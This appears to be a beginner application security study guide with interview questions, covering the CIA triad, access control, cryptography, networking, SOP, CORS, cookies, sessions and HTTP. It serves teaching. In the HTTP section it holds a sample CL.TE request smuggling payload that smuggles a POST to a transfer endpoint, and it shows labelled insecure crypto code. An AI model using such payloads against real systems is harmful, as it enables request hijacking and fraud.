# Section 1: Security Fundamentals (Weeks 1-2)

Welcome to the foundation of Application Security (AppSec)! If you're coming from a Python or web development background with zero security knowledge, you are in the right place. In development, we focus on making things *work*. In AppSec, we focus on *how things can be broken* and how to stop that from happening. 

This guide is extremely detailed, beginner-friendly, and optimized for your learning (and future interviews).

---

## 1. The CIA Triad 🛡️

### What it is
The CIA Triad is the foundational model of information security. It stands for **Confidentiality, Integrity, and Availability**. Every security control you ever build or test is trying to protect at least one of these three pillars.

*   **Confidentiality:** Keeping secrets secret. Only authorized people can view the data.
*   **Integrity:** Keeping data accurate and untampered. Only authorized people can change the data.
*   **Availability:** Keeping systems running. Data and services are accessible when needed.

### Why it matters for AppSec
When you look at a web application, you must ask: 
* "Can I read data I shouldn't?" (Confidentiality breach)
* "Can I modify data I shouldn't?" (Integrity breach)
* "Can I take the app offline?" (Availability breach)

### Real-world Examples & Analogies
*   **Analogy:** Think of a bank vault. Confidentiality is the thick steel walls so people can't see the money. Integrity is the ledger making sure nobody arbitrarily adds zeros to their balance. Availability is making sure the bank doors actually open during business hours so you can withdraw your cash.

### How CIA is violated in real attacks
| Pillar | Attack Example | Web App Impact |
| :--- | :--- | :--- |
| **Confidentiality** | Insecure Direct Object Reference (IDOR) | A user changes `user_id=5` to `user_id=6` in the URL and views another user's private messages. |
| **Integrity** | Cross-Site Scripting (XSS) or SQL Injection | An attacker injects SQL to change the price of an item in the database from \$100 to \$1. |
| **Availability** | Distributed Denial of Service (DDoS) | Attackers flood a login endpoint with millions of requests, crashing the server so real users can't log in. |

### CIA Applied to Different Scenarios
*   **E-commerce:** *Availability* is often king. If Amazon goes down for 5 minutes, they lose millions. *Integrity* is also huge (protecting prices).
*   **Banking:** *Integrity* is absolute priority. If a transaction amount is altered, it's disastrous. *Confidentiality* is a close second.
*   **Healthcare:** *Confidentiality* (HIPAA) and *Availability* (doctors need patient records *right now* to save lives) are paramount.

### Common Misunderstandings
*   ❌ **Wrong:** Security is just about keeping hackers out (Confidentiality).
*   ✅ **Correct:** Security is equally about ensuring data is accurate (Integrity) and systems are usable (Availability).

<details>
<summary>🎤 Interview Q: If you had to prioritize one pillar of the CIA triad for a hospital's critical patient care system, which would it be?</summary>

**Model Answer:** 
While all three are crucial, **Availability** is often the most critical in real-time patient care. If a doctor cannot access a patient's medical history or drug allergies during an emergency due to a ransomware attack taking the system offline, the patient could die. Confidentiality is legally mandated (HIPAA), and Integrity ensures correct treatment, but without Availability, the system fails its primary life-saving purpose.
</details>

## 2. Authentication vs. Authorization vs. Accounting (AAA) 🔑

### What it is
The AAA framework governs how access is managed.
*   **Authentication (AuthN):** Proving *who you are*. (e.g., logging in with a password).
*   **Authorization (AuthZ):** Checking *what you are allowed to do*. (e.g., are you an admin or a regular user?).
*   **Accounting (Logging/Auditing):** Tracking *what you actually did*. (e.g., logs showing User A deleted File B at 3:00 PM).

### Why it matters for AppSec
Developers constantly mix up AuthN and AuthZ. An application might have perfect AuthN (strong passwords, MFA) but terrible AuthZ (any logged-in user can access any other user's data).

### AuthN vs AuthZ Comparison
| Feature | Authentication (AuthN) | Authorization (AuthZ) |
| :--- | :--- | :--- |
| **Question** | Who are you? | What can you do? |
| **Analogy** | Checking your ID at the airport counter. | Checking your boarding pass at the VIP lounge. |
| **Examples** | Passwords, Biometrics, MFA, OTP. | Role-Based Access Control (RBAC), ACLs. |
| **Vulnerability** | Brute forcing passwords, credential stuffing. | IDOR, Privilege Escalation. |

### How IDOR is an AuthZ failure
Insecure Direct Object Reference (IDOR), also known as Broken Object Level Authorization (BOLA), happens when the app verifies you are logged in (AuthN is good) but *fails to verify if you own the resource you are requesting* (AuthZ failure).

### Common Misunderstandings
*   ❌ **Wrong:** We use JWT (JSON Web Tokens) for authentication.
*   ✅ **Correct:** JWTs are primarily used to carry *authorization* claims after *authentication* has already happened.
*   ❌ **Wrong:** A 401 status code means "Unauthorized."
*   ✅ **Correct:** Actually, HTTP 401 officially means "Unauthenticated" (you need to log in). HTTP 403 means "Unauthorized" (you are logged in, but lack permissions). The naming in the HTTP spec is famously confusing!

<details>
<summary>🎤 Interview Q: Explain the difference between Authentication and Authorization with a web app example. What vulnerabilities arise from failing each?</summary>

**Model Answer:**
Authentication is verifying identity. For example, a user logs in with a username and password. A failure here could lead to Credential Stuffing or Session Hijacking. 
Authorization is checking permissions after identity is established. For example, checking if the logged-in user has 'admin' privileges before letting them view a billing dashboard. A failure here leads to Insecure Direct Object Reference (IDOR) or Privilege Escalation, where a regular user can access another user's data or perform admin actions.
</details>

## 3. Security Principles 📐

These are the architectural rules that guide secure software design.

### 1. Least Privilege
**What it is:** A user, program, or process should have only the bare minimum privileges necessary to perform its function.
*   **DB Example:** The web app connecting to the database shouldn't use the `postgres` root user. It should use an `app_user` that can only `SELECT`, `INSERT`, `UPDATE` on specific tables, and *cannot* `DROP` tables.
*   **IAM Example:** An AWS EC2 instance that only needs to read from an S3 bucket should have a policy granting `s3:GetObject` only, not `s3:*` (Admin access).

### 2. Defense in Depth
**What it is:** Layering multiple security controls so that if one fails, another catches the threat.
*   **Diagram (Concept):**
    `[ WAF ] -> [ Network Firewall ] -> [ App AuthN/AuthZ ] -> [ Input Validation ] -> [ DB Encryption ]`
    If an attacker bypasses the WAF, the application's input validation should still catch the SQL injection.

### 3. Separation of Duties
**What it is:** Requiring more than one person to complete a critical task to prevent fraud or error.
*   **Example:** In a banking app, the developer who writes the code for money transfers cannot be the same person who pushes that code to the production server.

### 4. Zero Trust
**What it is:** "Never trust, always verify." Assume the network is already compromised.
*   **Explanation:** In the past, companies used a "castle-and-moat" model (VPN). Once inside the corporate network, you were trusted. In Zero Trust, even if a request comes from the internal company network, the app still demands strong authentication and authorization for every single API call.

### 5. Fail-Safe Defaults
**What it is:** Unless access is explicitly granted, it should be denied. When a system fails or crashes, it should default to a secure state.
*   **Example:** If your firewall's rules engine crashes, it should block *all* traffic, not allow *all* traffic.

### 6. Complete Mediation
**What it is:** Every access to every object must be checked for authority.
*   **Example:** Checking authorization on the `/api/view_profile` endpoint, but *forgetting* to check it on the `/api/download_profile_pdf` endpoint is a failure of complete mediation.

### 7. Open Design (Kerckhoffs's Principle)
**What it is:** Security should not rely on the secrecy of the design or algorithm (Security by Obscurity). It should only rely on the secrecy of the keys.
*   **Example:** Don't invent your own custom encryption algorithm. Use AES. Your security should hold up even if the attacker has your entire source code.

### 8. Economy of Mechanism
**What it is:** Keep the design as simple and small as possible. Complexity is the enemy of security.

<details>
<summary>🎤 Interview Q: What is Defense in Depth? Give an example of how you'd apply it to protect user passwords.</summary>

**Model Answer:**
Defense in Depth means applying multiple layers of security so a single failure doesn't compromise the system. To protect passwords:
1. Enforce strong password policies on the frontend and backend (Layer 1).
2. Hash passwords using a strong algorithm like Argon2 with a unique salt (Layer 2 - protects data if DB is stolen).
3. Transmit passwords only over TLS (Layer 3 - prevents network interception).
4. Implement rate limiting and account lockout to prevent brute force (Layer 4).
5. Implement MFA (Layer 5 - protects the account even if the password is stolen).
</details>

## 4. Cryptography Essentials 🔐

Cryptography is math used to secure communication. Let's break it down simply.

### Symmetric vs Asymmetric Encryption
| Feature | Symmetric Encryption | Asymmetric Encryption |
| :--- | :--- | :--- |
| **Keys** | Uses **ONE** shared key to encrypt and decrypt. | Uses a **PAIR** of keys (Public and Private). |
| **Speed** | Very Fast ⚡ | Very Slow 🐢 |
| **Algorithms** | AES, ChaCha20, DES (obsolete) | RSA, ECC (Elliptic Curve Cryptography) |
| **Best For** | Encrypting large amounts of data (like files or database rows). | Securely exchanging symmetric keys, Digital Signatures. |
| **Problem** | How do I securely share the one key with you? | Requires heavy computation. |

### AES Modes: Why ECB is Insecure
AES (Advanced Encryption Standard) is the gold standard for symmetric encryption. But *how* it processes data (the "mode") matters immensely.
*   **ECB (Electronic Codebook):** ❌ **TERRIBLE.** It encrypts identical blocks of plaintext into identical blocks of ciphertext.
    *   *The Penguin Example:* If you encrypt an image of the Linux Tux penguin using AES-ECB, the output still looks exactly like a penguin, just made of static. Patterns are preserved!
*   **CBC (Cipher Block Chaining):** ✅ Better. Uses an Initialization Vector (IV) so identical plaintexts look different.
*   **GCM (Galois/Counter Mode):** ✅✅ **BEST.** It provides both confidentiality (encryption) AND integrity/authenticity (it proves the ciphertext wasn't tampered with). Always use AES-GCM in modern apps.

### Hashing: One-Way Math
Encryption is two-way (can be decrypted). Hashing is ONE-WAY. You hash a password, you can never get the password back. You only verify by hashing the user's input again and comparing the hashes.

| Algorithm | Type | Speed | Security Status | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **MD5** | General Hash | Blazing Fast | ❌ **BROKEN** (Collisions) | Checksums only (verifying file downloads), NEVER passwords. |
| **SHA-1** | General Hash | Very Fast | ❌ **BROKEN** | Legacy systems, Git commits. NEVER passwords. |
| **SHA-256** | General Hash | Fast | ✅ Secure | Hashing files, blockchain, JWT signatures. Not ideal for passwords. |
| **bcrypt** | Password Hash | Intentionally SLOW | ✅ Secure | Standard for password hashing. |
| **Argon2** | Password Hash | Memory & CPU hard | ✅✅ Best | The modern winner for password hashing. |

**Why are MD5/SHA256 bad for passwords?**
They are designed to be fast. A modern GPU can calculate *billions* of MD5 hashes per second. If an attacker steals your database, they can brute-force an MD5 hash in milliseconds. `bcrypt` and `Argon2` are designed to be *intentionally slow* (e.g., taking 0.5 seconds per hash), making brute-forcing mathematically unfeasible.

### Digital Signatures and Certificates
1. **Goal:** Prove that a message came from Bob and wasn't altered.
2. **Step 1 (Hash):** Bob hashes his message.
3. **Step 2 (Sign):** Bob encrypts the *hash* using his **Private Key**. This is the digital signature.
4. **Step 3 (Verify):** Alice receives the message and the signature. She decrypts the signature using Bob's **Public Key** to reveal the hash. She then hashes the message herself. If the hashes match, the signature is valid!

### TLS Handshake (Simplified)
How HTTPS works:
1. **Client Hello:** Browser says "Hi, I support TLS 1.3 and these ciphers."
2. **Server Hello & Certificate:** Server says "Let's use TLS 1.3 and AES-GCM. Here is my SSL Certificate (containing my Public Key) signed by a trusted Authority."
3. **Key Exchange (Asymmetric):** The browser and server use complex math (Diffie-Hellman) using the public key to agree on a *shared secret key*.
4. **Secure Communication (Symmetric):** They switch to blazing-fast Symmetric encryption (AES) using the shared secret for the rest of the session.

### Common Crypto Mistakes in Code
```python
# ❌ INSECURE: Using a hardcoded, static IV or secret
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
iv = b'1234567890123456' # Terrible! IV must be random for every encryption.

# ❌ INSECURE: Using MD5 for passwords
import hashlib
password_hash = hashlib.md5(b"mypassword").hexdigest()

# ✅ SECURE: Using bcrypt for passwords
import bcrypt
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(b"mypassword", salt)
```

<details>
<summary>🎤 Interview Q (HSBC): What encryption algorithms are used in JWT? Which is strongest?</summary>

**Model Answer:**
JWTs don't actually use *encryption* by default; they use *digital signatures* for integrity. The most common signing algorithms are HS256 (HMAC with SHA-256) and RS256 (RSA with SHA-256). 
*   **HS256** is symmetric (uses one shared secret key for signing and verifying).
*   **RS256** is asymmetric (uses a private key to sign, and a public key to verify).
**RS256 is stronger and safer** for distributed systems because you can freely share the public key for verification without giving away the ability to create new tokens (which requires the private key).
*Note: JWTs can be encrypted (JWE), often using algorithms like RSA-OAEP for key wrapping and AES-GCM for payload encryption.*
</details>

## 5. Networking for Security 🌐

You cannot hack or secure what you don't understand. The internet runs on layers.

### The OSI Model (Security Perspective)
| Layer | Name | What it is | Security Relevance / Attacks |
| :--- | :--- | :--- | :--- |
| **7** | Application | HTTP, FTP, SMTP, DNS. Where web apps live. | SQLi, XSS, CSRF, Application DDoS (Layer 7). WAFs operate here. |
| **6** | Presentation | Encryption, data formatting. | TLS/SSL attacks, poor encryption implementation. |
| **5** | Session | Maintains connections. | Session hijacking. |
| **4** | Transport | **TCP** (reliable) and **UDP** (fast). Uses **Ports**. | Port scanning (Nmap), SYN Floods. |
| **3** | Network | **IP** Addresses, Routers. | IP Spoofing, Ping sweeps, network routing attacks. |
| **2** | Data Link | MAC Addresses, Switches. | ARP Spoofing, MAC Flooding (local network attacks). |
| **1** | Physical | Cables, Wi-Fi radio waves. | Cutting cables, Wi-Fi sniffing. |

### TCP 3-Way Handshake
TCP ensures reliable delivery. Before data is sent, a connection is established:
1. **SYN:** Client sends a synchronization packet to the Server. ("Can we talk?")
2. **SYN-ACK:** Server acknowledges and sends its own SYN. ("Yes, I hear you, can you hear me?")
3. **ACK:** Client acknowledges the server. ("Yes, let's talk.")
*Security context:* A "SYN Flood" DDoS attack sends millions of SYN packets but never sends the final ACK, leaving the server's resources hanging open until it crashes.

### HTTP Basics (Layer 7)
**Methods:**
*   `GET`: Fetch data (Should NEVER change state in the DB).
*   `POST`: Create new data.
*   `PUT`/`PATCH`: Update data.
*   `DELETE`: Remove data.

**Status Codes:**
*   `200 OK`: Success.
*   `302 Found`: Redirect.
*   `400 Bad Request`: Client messed up the syntax.
*   `401 Unauthorized`: (Actually means Unauthenticated).
*   `403 Forbidden`: Authenticated, but no permission (AuthZ failure).
*   `404 Not Found`: Doesn't exist.
*   `500 Internal Server Error`: Server crashed (often useful for finding vulnerabilities!).

### DNS Resolution (How domain names become IPs)
1. Browser asks OS cache: "What is the IP of google.com?"
2. OS asks ISP's DNS Resolver.
3. Resolver asks the Root Server (`.`).
4. Root tells it to ask the TLD Server (`.com`).
5. TLD tells it to ask the Authoritative Name Server (Google's servers).
6. Google's server returns `142.250.190.46`.
*Security Context:* DNS Spoofing attacks trick the resolver into returning a malicious IP, sending the user to a fake phishing site.

<details>
<summary>🎤 Interview Q (HSBC): Which layer does Nmap work in?</summary>

**Model Answer:**
Nmap primarily operates at **Layer 4 (Transport Layer)** by sending TCP and UDP packets to specific ports to determine if they are open, closed, or filtered. However, when using OS detection (`-O`) it utilizes **Layer 3 (Network Layer)** nuances in IP packets, and when using Service Version Detection (`-sV`) or Nmap Scripting Engine (NSE) scripts, it interacts directly with **Layer 7 (Application Layer)** protocols to banner grab or exploit services.
</details>

<details>
<summary>🎤 Interview Q (HSBC): Which port does ICMP use?</summary>

**Model Answer:**
This is a trick question. ICMP (Internet Control Message Protocol), which is used by tools like `ping`, operates at **Layer 3 (Network Layer)** of the OSI model. Ports are a concept introduced at Layer 4 (Transport Layer) for TCP and UDP. Therefore, ICMP does not use ports at all; it uses "Type" and "Code" fields to define the message structure.
</details>

<details>
<summary>🎤 Interview Q (HSBC): Nmap is written in which language?</summary>

**Model Answer:**
The core of Nmap is written in **C and C++**. However, the Nmap Scripting Engine (NSE), which allows for custom vulnerability checks and advanced scanning, is written in **Lua**.
</details>

## 6. Same-Origin Policy (SOP) — DEEP TREATMENT

### 🎯 What it is
A **browser security mechanism** that restricts web pages from making requests to a different origin (domain, protocol, port) than the one that served the page, **and especially from reading the response**.

- **Origin** = `scheme` + `hostname` + `port`
    - `https://example.com:443` and `https://example.com` → **same origin**
    - `https://example.com` and `http://example.com` → **different origin** (different scheme)
    - `https://example.com` and `https://api.example.com` → **different origin** (different subdomain)

### ⚙️ Why it matters (Goal)
Protect sensitive data from being accessed by unauthorized scripts from another site.

### 🔍 Example in action
- If you’re logged into `bank.com`, a malicious site `evil.com` **cannot** read your account balance from `bank.com` via JavaScript because of SOP.

### 🛡️ Analogy
Think of **SOP** as a locked door in your house — no one can enter from outside by default.

### 📊 Key Difference: SOP vs CSRF
| Feature | Same-Origin Policy (SOP) | Cross-Site Request Forgery (CSRF) |
| --- | --- | --- |
| **Type** | Browser-enforced security rule | Web application vulnerability / attack |
| **Purpose** | Restricts *reading* data across different origins | Tricks the browser into sending authenticated requests |
| **Blocks?** | Reading from another origin | Not blocked — requests can still be sent |
| **Who enforces?** | Browser | Must be mitigated by the application developer |
| **Relation to cookies** | Still sends cookies on cross-origin requests | Exploits cookies being auto-sent without user consent |
| **Mitigations** | Not applicable (SOP is the mitigation) | CSRF tokens, SameSite cookies, double-submit cookies |

**In short:**
- **SOP** = rule that stops malicious sites from *reading* your data across origins.
- **CSRF** = tricking your browser into *sending* unwanted requests to a site where you’re logged in — **SOP does not prevent this** because it blocks reading, not sending.

---


## 7. CORS (Cross-Origin Resource Sharing) — DEEP TREATMENT

### 🎯 What it is
A **protocol / mechanism** (using HTTP headers) that allows servers to explicitly tell browsers which origins are allowed to access their resources. It is essentially a **controlled relaxation of the Same-Origin Policy**.

### ⚙️ Why it exists
- **Problem:** SOP is too strict for modern web apps. Your JavaScript on `https://myapp.com` can’t read data from an API at `https://api.partner.com` even if both sites want it.
- **Solution:** CORS gives the server a way to tell the browser: *“It’s okay to share this data with pages from this origin.”*

### 🛠️ How It Works (Step-by-Step)
CORS behavior depends on the **type of request**:

#### A. Simple Requests
These are allowed *without* a preflight request if they meet all conditions:
- Methods: `GET`, `HEAD`, or `POST`
- Headers: Only "simple" ones (`Accept`, `Accept-Language`, `Content-Language`, `Content-Type` with certain values)

**Flow:**
1. Browser sends request to server.
2. Server responds with data **plus** a header like: `Access-Control-Allow-Origin: https://myapp.com`
3. If the header matches the requesting origin, browser allows JS to read the response. If not, browser blocks JS from reading it.

#### B. Preflighted Requests
When requests are **not simple** (e.g., `PUT`, `DELETE`, custom headers):
1. **Preflight OPTIONS request** is sent by the browser.
2. Server responds with allowed methods/headers.
3. If allowed, browser sends the **actual request**. If not allowed, browser blocks the request before it’s sent.

#### C. Credentialed Requests (Cookies, HTTP Auth)
By default, CORS requests **do not send cookies**. To allow them:
- Client sets: `fetch('url', { credentials: 'include' })`
- Server responds with: `Access-Control-Allow-Credentials: true`
⚠️ **Note:** Cannot use `Access-Control-Allow-Origin: *` with credentials.

### 🛡️ Analogy
If **SOP** is the locked door, **CORS** is you giving a **guest pass** to specific people you trust so they can enter.

### 📊 Key Difference: SOP vs CORS
| Feature | Same-Origin Policy (SOP) | Cross-Origin Resource Sharing (CORS) |
| --- | --- | --- |
| **Nature** | Security restriction | Permission mechanism |
| **Who defines it?** | Browser spec | HTTP protocol extension |
| **Who enforces it?** | Browser | Browser (using server’s CORS headers) |
| **Default** | Block cross-origin reads | Allow if server says so |
| **Purpose** | Protect data | Share data safely |

### 🚨 Common Misunderstandings
- ❌ *"CORS stops hackers from sending requests to my API"* — No, it only stops browsers from reading responses unless allowed.
- ❌ *"If I set `Access-Control-Allow-Origin: *`, my API is safe"* — Not true, it means anyone can read your API responses from anywhere.
- ❌ *"If we have allowed `shop.com` in CORS then `console.shop.com` is allowed by default"* — **No.** SOP treats every subdomain as a different origin. CORS is an exact string match.

### 💡 Safe CORS Subdomain Handling Pattern
To safely allow `shop.com` AND `*.shop.com`:
1. Read the `Origin` header from the request.
2. Parse it as a URL.
3. Validate: `originHost === "shop.com"` OR `originHost.endsWith(".shop.com")`.
4. **Return the exact matched origin string** in `Access-Control-Allow-Origin`.
5. Include `Vary: Origin` so caches don’t mix responses.



## 8. Cookies Deep Dive 🍪

Cookies are small pieces of data servers send to the browser. The browser automatically attaches them to subsequent requests to that same server. This is how the stateless HTTP protocol maintains "sessions."

### Cookie Attributes
When a server sets a cookie (`Set-Cookie: session=1234`), it can attach security rules.

*   **Domain:** Which domains get the cookie. If Domain is `shop.com`, it will also be sent to `api.shop.com` and `console.shop.com` (Subdomains are included! This is different from SOP/CORS).
*   **Path:** Restricts cookies to a specific path (e.g., `Path=/admin`).
*   **Expires / Max-Age:** When the cookie dies.

### Critical Security Flags
*   **HttpOnly:** 🛡️ **Defends against XSS.** Tells the browser: "Javascript is NEVER allowed to read this cookie via `document.cookie`." If an attacker gets XSS, they can't steal the session token.
*   **Secure:** 🛡️ **Defends against network sniffing.** Tells the browser: "Only send this cookie over HTTPS, never unencrypted HTTP."
*   **SameSite:** 🛡️ **Defends against CSRF.** Controls whether the cookie is sent during cross-site requests.

### SameSite Cookie Comparison
| SameSite Value | Behavior | Use Case |
| :--- | :--- | :--- |
| `Strict` | The cookie is NEVER sent if the request originates from a different site. Even if clicking a link from an email. | Highly secure apps (banking). Downside: Clicking a link to the app logs you out. |
| `Lax` (Default) | Sent on top-level navigations (clicking a normal link), but NOT sent on cross-site POST requests (like a hidden form submission). | Standard protection. Stops most CSRF attacks while keeping usability. |
| `None` | Always sent, even on cross-site requests. | Necessary for 3rd-party cookies (like embedded YouTube widgets or SSO flows). **Must be used with the `Secure` flag.** |

### Double Submit Cookie Pattern
A defense against CSRF when SameSite isn't enough or isn't supported.
1. Server sets a random `csrf_token` in a cookie.
2. Frontend reads the cookie (must NOT be HttpOnly for this to work, or sent via a separate mechanism).
3. Frontend includes that exact token in a hidden form field or HTTP Header (`X-CSRF-Token`).
4. Server verifies that the token in the Cookie matches the token in the Header. Since an attacker (due to SOP) cannot read the cookie, they cannot attach the matching header.

<details>
<summary>🎤 Interview Q (HSBC/Flipkart): What are the ways to mitigate CSRF attacks?</summary>

**Model Answer:**
There are three primary ways to mitigate Cross-Site Request Forgery (CSRF):
1. **SameSite Cookie Attribute:** Setting session cookies to `SameSite=Lax` or `Strict` instructs the browser not to attach the session cookie to cross-site POST requests, neutralizing the attack at the browser level.
2. **Anti-CSRF Tokens (Synchronizer Token Pattern):** The server generates a unique, unpredictable token linked to the user's session and embeds it in HTML forms. The server validates this token on submission. An attacker cannot guess the token.
3. **Double Submit Cookie Pattern:** The server sends a random token in a cookie, and the frontend JS must read it and include it in a custom HTTP header (like `X-CSRF-Token`). The server validates that the cookie and header values match. Attackers can't read the cookie due to the SameOrigin Policy, so they can't forge the matching header.
</details>

---


## 9. Sessions and Tokens 🎫

How does the server know you are still logged in? Two main approaches.

### Session-based vs Token-based Authentication

| Feature | Session-Based (Stateful) | Token-Based / JWT (Stateless) |
| :--- | :--- | :--- |
| **Where is state kept?**| **Server.** The server stores the session data (in RAM/Redis/DB). | **Client.** The token contains the data itself. Server stores nothing. |
| **What does Client hold?** | A meaningless string (Session ID) like `abcde123`. | A signed payload (JWT) containing data like `{"user_id": 5, "role": "admin"}`. |
| **Validation** | Server looks up the Session ID in its database. | Server verifies the cryptographic signature of the token. |
| **Revocation (Logging out)**| Easy. Server just deletes the ID from the database. | Hard. Token is valid until it expires. Requires complex blocklists. |
| **Scalability** | Harder. All servers must share the same session database. | Easy. Any server with the secret key can validate the token. |

### Session Hijacking vs Session Fixation
*   **Session Hijacking:** An attacker steals a user's *existing, active* session ID (via XSS, sniffing, or malware) and impersonates them.
*   **Session Fixation:** An attacker *forces* a known session ID onto a victim's browser *before* they log in. When the victim logs in, the session ID is upgraded to authenticated status. The attacker, who already knew the ID, now has access. 
    *   *Fix:* **Always generate a brand new Session ID the moment a user logs in.**

# Section 2: Web Application Architecture & Protocols (Weeks 3-4)

Welcome to the **Web Application Architecture** section! To hack an application, you must first understand how it is built, how the components communicate, and where the weak links are. This section is an exhaustive deep dive into how modern web applications function and how to secure them.

---

## 1. How Web Applications Work End-to-End

### What it is
A web application operates on a **client-server model**. The client (usually a web browser) makes requests, and the server processes these requests and returns a response. 

### Why it exists
This architecture allows centralized data processing and storage (on servers) while providing a user-friendly interface globally (via browsers).

### The Full Request Flow: Browser to Database
1. **Browser**: User types `https://bank.com`.
2. **DNS (Domain Name System)**: Translates `bank.com` into an IP address (e.g., `192.0.2.1`).
3. **CDN (Content Delivery Network)**: If cached, serves static assets (images, CSS) to speed up load times.
4. **Load Balancer**: Distributes incoming traffic across multiple web servers to ensure no single server is overwhelmed.
5. **Web Server**: (e.g., Nginx, Apache) Handles raw HTTP requests and serves static content. Routes dynamic requests to the app server.
6. **Application Server**: (e.g., Node.js, Django, Spring Boot) Executes business logic, authenticates users, and processes data.
7. **Database**: (e.g., PostgreSQL, MongoDB) Stores and retrieves persistent data based on the App Server's queries.

### Component Security Implications
- **CDN**: Misconfigurations can lead to cache poisoning or exposing sensitive cached data.
- **Load Balancer**: Susceptible to HTTP Request Smuggling if it parses HTTP requests differently than the backend web server.
- **App Server**: The primary target for business logic flaws, injections, and insecure deserialization.
- **Database**: Target of SQL Injection (SQLi). Must enforce strict access controls.

### Static vs Dynamic Content
| Feature | Static Content | Dynamic Content |
|---------|----------------|-----------------|
| **Definition** | Unchanging files (HTML, CSS, JS, Images). | Content generated on the fly based on user input or state. |
| **Served By** | CDN, Web Server. | Application Server, Database. |
| **Security Risk** | Lower (mostly cache poisoning, information disclosure). | Higher (Injections, XSS, IDOR, Business Logic flaws). |

<details>
<summary>🎤 Interview Q: "Explain the full journey of a request from the moment you hit enter in the browser."</summary>

**Model Answer:**
1. **DNS Resolution**: The browser checks its cache, OS cache, router cache, and ISP DNS to resolve the hostname to an IP address.
2. **TCP/TLS Handshake**: A TCP connection is established (SYN, SYN-ACK, ACK), followed by a TLS handshake for encryption.
3. **HTTP Request**: The browser sends an HTTP GET request.
4. **WAF/Load Balancer**: The request hits a Web Application Firewall (checking for malicious payloads) and a load balancer.
5. **Web/App Server**: The request reaches the backend. The App Server runs business logic, querying databases or microservices as needed.
6. **HTTP Response**: The App Server sends an HTML response back through the load balancer.
7. **Browser Rendering**: The browser parses the HTML, executes JavaScript, requests sub-resources (CSS, images), and renders the DOM.
</details>

---


## 2. HTTP Protocol Deep Dive

### What it is
HTTP (Hypertext Transfer Protocol) is the foundation of data communication on the Web. It is a stateless, text-based protocol.

### HTTP Request Structure
```http
POST /api/transfer HTTP/1.1              <-- Request Line (Method, URI, Version)
Host: api.bank.com                       <-- Headers
Authorization: Bearer eyJhbG...          <-- Headers
Content-Type: application/json           <-- Headers
Content-Length: 42                       <-- Headers
                                         <-- Empty Line (CRLF) indicating end of headers
{"account_to": "12345", "amount": 1000}  <-- Message Body
```

### HTTP Response Structure
```http
HTTP/1.1 200 OK                          <-- Status Line (Version, Status Code, Reason Phrase)
Date: Wed, 21 Oct 2026 07:28:00 GMT      <-- Headers
Content-Type: application/json           <-- Headers
Set-Cookie: session=xyz; Secure; HttpOnly<-- Headers
                                         <-- Empty Line (CRLF)
{"status": "success", "tx_id": 99912}    <-- Message Body
```

### HTTP Methods Table
| Method | Purpose | Security Relevance |
|--------|---------|--------------------|
| `GET` | Retrieve data | Should be idempotent. Never use for sensitive state changes (prone to CSRF/leakage in logs). |
| `POST` | Submit data/state change | Use for sensitive actions. Requires CSRF protection. |
| `PUT` | Replace resource | Can lead to Mass Assignment or Arbitrary File Upload if unvalidated. |
| `DELETE`| Remove resource | High impact if authorization (IDOR) is missing. |
| `OPTIONS`| Describe communication options | Used in CORS preflight checks. Can reveal supported methods. |
| `TRACE` | Echo back received request | High risk of Cross-Site Tracing (XST). Often disabled. |

### HTTP Status Codes
| Category | Meaning | Examples & Security Context |
|----------|---------|-----------------------------|
| **1xx** | Informational | `101 Switching Protocols` (WebSockets). |
| **2xx** | Success | `200 OK`, `201 Created`. |
| **3xx** | Redirection | `301 Moved Permanently`, `302 Found` (Target of Open Redirects). |
| **4xx** | Client Error | `401 Unauthorized` (needs login), `403 Forbidden` (logged in, but no access - check for IDOR/BOLA), `404 Not Found`. |
| **5xx** | Server Error | `500 Internal Server Error` (Can leak stack traces). |

### HTTP Versions Comparison
| Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---------|----------|--------|--------|
| **Transport** | TCP | TCP | UDP (QUIC) |
| **Format** | Text-based | Binary framing | Binary framing |
| **Multiplexing**| No (Head-of-line blocking) | Yes (over single TCP) | Yes (No TCP head-of-line blocking) |
| **Security Risk**| Request Smuggling | HTTP/2 Downgrade attacks, Frame injections | Newer, less mature tooling |

### HTTP Request Smuggling (HSBC/Flipkart relevant)
**Why it happens:**
Occurs when a frontend proxy (load balancer) and backend server disagree on where a request ends. This happens because HTTP/1.1 allows two ways to specify request length: `Content-Length` (CL) and `Transfer-Encoding` (TE).

**CL.TE Attack Flow:**
1. Attacker sends a crafted request with *both* `Content-Length` and `Transfer-Encoding` headers.
2. The Frontend uses `Content-Length`. It forwards the entire payload.
3. The Backend uses `Transfer-Encoding: chunked`. It stops processing at the first `0\r\n\r\n` (zero chunk).
4. The remaining payload is treated by the backend as the *start of the next request* (which might belong to an innocent user!).

```http
POST / HTTP/1.1
Host: bank.com
Content-Length: 44
Transfer-Encoding: chunked

0

POST /transfer HTTP/1.1
Host: bank.com
...
```
*(The frontend sees one 44-byte request. The backend sees an empty chunked request, followed by a smuggled POST request).*

<details>
<summary>🎤 Interview Q (HSBC): "Explain CL.TE and TE.CL Request Smuggling."</summary>

**Model Answer:**
Request smuggling targets the discrepancy in parsing request boundaries between frontend and backend servers.
- **CL.TE**: Frontend uses Content-Length, Backend uses Transfer-Encoding. The attacker sends a request where CL is larger than the chunked TE payload. The backend stops reading at the `0` chunk, leaving the remaining attacker-controlled bytes in the pipeline to poison the next user's request.
- **TE.CL**: Frontend uses Transfer-Encoding, Backend uses Content-Length. The attacker sends a chunked payload where CL only covers the first part of the chunk. The frontend forwards the whole chunk, but the backend stops reading early due to the short CL, smuggling the rest.
Defense: Use HTTP/2 end-to-end, or configure frontend/backend to consistently reject requests with both headers.
</details>

## 3. Security Headers — COMPREHENSIVE

Security headers are HTTP response headers that instruct the browser on how to behave securely.

| Header | What it does | Example Value | Prevents | What happens without it? |
|--------|--------------|---------------|----------|--------------------------|
| **Content-Security-Policy (CSP)** | Restricts where resources (JS, CSS, images) can be loaded from. | `default-src 'self'; script-src 'self' https://trusted.com;` | XSS, Clickjacking, Data Injection | Browser executes any injected inline script or external malicious JS. |
| **Strict-Transport-Security (HSTS)** | Forces browsers to strictly use HTTPS for the domain. | `max-age=31536000; includeSubDomains` | MiTM, SSL Stripping | Users typing `http://` might be intercepted before the server redirects. |
| **X-Frame-Options (XFO)** | Prevents the site from being rendered inside an `&lt;iframe&gt;`. | `DENY` or `SAMEORIGIN` | Clickjacking | Attackers can frame the site and trick users into clicking buttons (e.g., transferring money). |
